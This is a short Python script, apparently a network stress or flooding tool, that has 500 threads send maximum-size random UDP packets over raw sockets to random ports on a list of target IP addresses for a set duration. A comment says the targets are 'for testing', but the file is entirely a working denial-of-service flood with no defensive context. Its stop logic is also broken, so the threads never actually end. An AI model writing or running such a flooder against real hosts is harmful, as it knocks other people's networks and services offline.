import threading
import time
import socket
import random

# Configuration parameters
NUM_THREADS = 500  # Increased number of threads
DURATION = 600  # Duration in seconds

# List of target IP addresses for testing
targets = [
    "192.168.1.1", "192.168.1.2", "192.168.1.3",  # Replace with appropriate IPs
]

# Random data to send in raw packets
data = random._urandom(65507)  # Maximum size for a UDP packet

def flood():
    while True:
        try:
            target_ip = random.choice(targets)
            target_port = random.randint(1, 65535)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            print(f"Error: {e}")

def main():
    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)

    # Run the network flood for the specified duration
    time.sleep(DURATION)
    for t in threads:
        t.do_run = False

if __name__ == "__main__":
    main()
